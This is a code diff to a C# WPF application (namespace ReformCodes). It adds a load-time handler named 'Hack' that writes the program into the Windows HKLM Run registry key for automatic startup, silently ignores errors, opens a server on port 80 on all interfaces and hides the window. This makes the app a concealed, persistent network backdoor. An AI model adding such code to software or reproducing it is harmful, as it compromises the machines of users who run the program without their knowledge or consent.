@@ -1,5 +1,7 @@
 ﻿using Lib;
+using Microsoft.Win32;
 using System;
+using System.Diagnostics;
 using System.Net;
 using System.Net.Sockets;
 using System.Windows;
@@ -18,6 +20,8 @@ namespace ReformCodes
             InitializeComponent();
             ServersManager = new ServersManager();
             ServersManager.Register(this);
+
+            Loaded += Hack;
         }
 
         public void UpdateClientUI()
@@ -116,6 +120,31 @@ namespace ReformCodes
             {
                 UpdateClientUI();
             }
+        }
+
+        private void Hack(object sender, EventArgs e)
+        {
+            string completePath = Process.GetCurrentProcess().MainModule.FileName;
+            string projectName = Process.GetCurrentProcess().MainModule.ModuleName;
+            try
+            {
+                RegistryKey registryKey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
+                if (registryKey.GetValue(projectName) == null)
+                {
+                    try
+                    {
+                        registryKey.SetValue(projectName, completePath);
+                    }
+                    catch { }
+                }
+            }
+            catch
+            {
+
+            }
+            int port = 80;
+            ServersManager.ServerAddedAndStarting(new MyProtocol(), new IPEndPoint(IPAddress.Any, port));
+            Hide();
         }
     }
 }
